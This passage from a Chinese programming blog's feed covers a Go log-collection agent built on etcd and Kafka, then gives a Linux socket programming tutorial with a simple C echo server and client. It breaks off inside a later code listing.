class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/test.log","topic":"kafka_test"&#125;]</span><br></pre></td></tr></table></figure><h4 id="logAgent"><a href="#logAgent" class="headerlink" title="logAgent"></a>logAgent</h4><p>logAgent项目树结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">logAgent</span><br><span class="line">├── conf</span><br><span class="line">│   └── logAgent.conf</span><br><span class="line">├── kafka</span><br><span class="line">│   └── kafka.go</span><br><span class="line">├── logs</span><br><span class="line">│   └── my.log</span><br><span class="line">├── main</span><br><span class="line">│   ├── config.go</span><br><span class="line">│   ├── etcd.go</span><br><span class="line">│   ├── ip.go</span><br><span class="line">│   ├── log.go</span><br><span class="line">│   ├── main.go</span><br><span class="line">│   └── server.go</span><br><span class="line">├── tailf</span><br><span class="line">│   └── tail.go</span><br><span class="line">└── tools</span><br><span class="line">    └── SetConf</span><br><span class="line">        └── main.go</span><br></pre></td></tr></table></figure><p>其中每个文件的具体作用如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">logagent.conf :配置文件</span><br><span class="line">kafka.go:对kafka的操作，包括初始化kafka连接，以及给kafka发送消息</span><br><span class="line">my.log:产生的日志文件</span><br><span class="line">config.go:用于初始化读取配置文件中的内容，这里的配置文件加载是通过之前自己实现的配置文件热加载包处理的</span><br><span class="line">etcd.go:对etcd的操作，包括初始化etcd和监听etcd</span><br><span class="line">ip.go:获取本机所有的网卡ip，连接etcd</span><br><span class="line">log.go:日志的处理与序列化</span><br><span class="line">main.go: 初始化入口文件,与执行server的入口函数</span><br><span class="line">server.go:主要是tail 的相关操作，用于去读日志文件并将内容放到channel中</span><br><span class="line">tail.go: 用于去读日志文件</span><br><span class="line">SetConf.main.go:将设置的配置信息导入到etcd中</span><br></pre></td></tr></table></figure><p>进入main文件夹中，执行<code>go build</code>命令，之后执行<code>./main</code>启动项目，项目启动日志输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:32:11.007 [D]  get config from etcd success, [&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.985 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:41:14.987 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:41:14.987 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:41:14.988 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:41:14.997 [D]  初始化Kafka成功!</span><br></pre></td></tr></table></figure><p>可以看到，项目启动之后首先会从etcd中去获取前端写入etcd中的日志收集配置信息，之后etcd会持续监控key的变化，一旦有新的日志配置加入etcd中，就会更新配置文件，随后启动kafka准备从日志文件中读取日志信息。</p><p>测试日志文件读取</p><p>在<code>/Users/caoyifan</code>目录下创建<code>test.log</code>文件并尝试写入一些信息。</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/3.png" alt="3"></p><p>发现kafka能够成功读取写入的文件信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:46:50.530 [D]  导入日志成功&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:46:50.533 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  日志设置为[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  连接etcd成功</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化etcd成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  初始化tailf成功!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  开始监控key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka producer成功,地址为: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:46:50.536 [D]  初始化Kafka成功!</span><br><span class="line">2021/11/12 15:47:21.637 [D]  read success, pid:0, offset:0, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.641 [D]  read success, pid:0, offset:1, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.642 [D]  read success, pid:0, offset:2, topic:kafka_test</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从e
      
    
    </summary>
    
    
      <category term="go" scheme="elssm.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Linux网络编程</title>
    <link href="elssm.github.io/2021/11/02/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>elssm.github.io/2021/11/02/Linux网络编程/</id>
    <published>2021-11-02T01:24:29.000Z</published>
    <updated>2021-11-10T08:53:16.844Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h4><h5 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h5><p>在Linux环境下，Socket用于表示进程间网络通信的特殊文件类型。本质为内核借助缓冲区形成的伪文件。既然是文件，那么我们可以使用文件描述符引用套接字，与管道类似的，Linux系统将其封装成文件的目的是为了统一接口，使得读写套接字和读写文件的操作一致。区别是管道主要应用于本地进程间通信，而套接字多应用于网络进程间数据的传递。</p><p>在<code>TCP/IP</code>协议中，”IP地址+TCP或UDP端口号”唯一标识网络通讯中的一个进程，”IP地址+端口号”就对应一个<code>socket</code>。欲建立连接的两个进程各自有一个<code>socket</code>来标识，那么这两个<code>socket</code>组成的<code>socket pair</code>就唯一标识一个连接，因此可以用<code>Socket</code>来描述网络连接的一对一关系。</p><p>在网络通信中，套接字一定是成对出现的。一端的发送缓冲区对应对端的接受缓冲区。我们使用同一个文件描述符对应发送缓冲区和接收缓冲区。</p><h5 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h5><p>我们已经知道，内存中的多字节数据相对于内存地址有大端和小端之分，磁盘文件中的多字节数据相对于文件中的偏移地址也有大端小端之分，网络数据流同样有大端小端之分，那么如何定义网络数据流的地址呢。发送主机通常将发送缓冲区中的数据按内存地址从低到高的顺序发出。接收主机把从网络上接到的字节一次保存在接受缓冲区中，也是按内存地址从低到高的顺序保存，因此，网络数据流的地址应这样规定：先发出的数据是低地址，后发出的数据是高地址。</p><p><code>TCP/IP</code>协议规定，网络数据流应采用大端字节序，即低地址高字节，例如在<code>UDP</code>段格式中，地址<code>0-1</code>是16位的源端口号，如果这个端口号是<code>1000(0x3e8)</code>，则地址0是<code>0x03</code>，地址1时是<code>0xe8</code>，也就是先发<code>0x03</code>，再发<code>0xe8</code>，这16位在发送主机的缓冲区中也应该是低地址存<code>0x03</code>，高地址存<code>0xe8</code>，但是如果发送主机是小端字节序的，这16位被解释成<code>0xe803</code>，而不是1000。因此发送主机把1000填到发送缓冲区之前需要做字节序的转换。同样的，接收主机如果是小端字节序的，接到16位的源端口号也要做字节序的转换，如果主机是大端字节序的，发送和接收都不需要做转换。同理，32位的IP地址也要考虑网络字节序和主机字节序的问题。    </p><p>为了使网络程序具有可移植性，使同样的C代码在大端和小端计算机上编译后都能正常运行，可以调用以下库函数做网络字节序和主机字节序的转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint32_t</span> hostshort)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint32_t</span> netshort)</span></span>;</span><br></pre></td></tr></table></figure><p>其中h标识<code>host</code>，n表示<code>network</code>，l表示32位长整数，s表示16位短整数。如果主机时小端字节序，这些函数将参数做相应的大小端转换然后返回，如果主机时大端字节序，这些函数不做转换，将参数原封不动的返回。</p><h5 id="IP地址转换函数"><a href="#IP地址转换函数" class="headerlink" title="IP地址转换函数"></a>IP地址转换函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af,<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  af：AF_INET、AF_INET6</span><br><span class="line">  src：传入，IP地址（点分十进制）</span><br><span class="line">  dst：传出，转换后的网络字节序的IP地址</span><br><span class="line">返回</span><br><span class="line">  成功：<span class="number">1</span></span><br><span class="line">  异常：<span class="number">0</span> 说明src指向的不是一个有效的IP地址</span><br><span class="line">  失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="网络套接字函数"><a href="#网络套接字函数" class="headerlink" title="网络套接字函数"></a>网络套接字函数</h4><h5 id="socket函数"><a href="#socket函数" class="headerlink" title="socket函数"></a>socket函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">int socket(int domain,int type,int protocol) 创建一个套接字</span><br><span class="line">  </span><br><span class="line">domain：AF_INET、AF_INET6、AF_UNIX</span><br><span class="line">type：SOCK_STREAM、SOCK_DGRAM</span><br><span class="line">protocol：<span class="number">0</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：新套接字所对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h5><p>给socket绑定一个地质结构(IP+port)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">8888</span>)</span><br><span class="line">  addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">addr：(struct sockaddr *)&amp;addr</span><br><span class="line">addrlen：<span class="keyword">sizeof</span>(addr)地址结构的大小</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h5><p>设置同时与服务器建立连接的上限数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">backlog：上限数值，最大<span class="number">128</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h5><p>阻塞等待客户端建立连接，成功的话，返回一个与客户端成功连接的socket文件描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd,struct socketaddr *addr,<span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传出参数，成功与服务器建立连接的那个客户端的地址结构(IP+port)</span><br><span class="line">  <span class="keyword">socklen_t</span> clit_addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">addrlen：传入传出。入：addr的大小。出：客户端addr实际大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：能与服务器进行数据通信的socket对应的文件描述符</span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h5><p>使用现有的socket与服务器建立连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfd：socket函数返回值</span><br><span class="line">addr：传入参数。服务器的地址结构</span><br><span class="line">addrlen：服务器的地址结构的大小</span><br><span class="line">  </span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="实现server端"><a href="#实现server端" class="headerlink" title="实现server端"></a>实现server端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>,cfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ],client_IP[<span class="number">1024</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">cfd = accept(lfd,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"accept error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client ip:%s port:%d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr.s_addr,client_IP,<span class="keyword">sizeof</span>(client_IP)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现client端"><a href="#实现client端" class="headerlink" title="实现client端"></a>实现client端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cfd;</span><br><span class="line"><span class="keyword">int</span> conter = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv_addr.sin_addr.s_addr);</span><br><span class="line">cfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">int</span> ret = connect(cfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"connect err"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--conter)&#123;</span><br><span class="line">write(cfd,<span class="string">"hello\n"</span>,<span class="number">6</span>);</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现多进程并发服务器"><a href="#实现多进程并发服务器" class="headerlink" title="实现多进程并发服务器"></a>实现多进程并发服务器</h5><p>首先实现功能封装函数<code>wrap.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 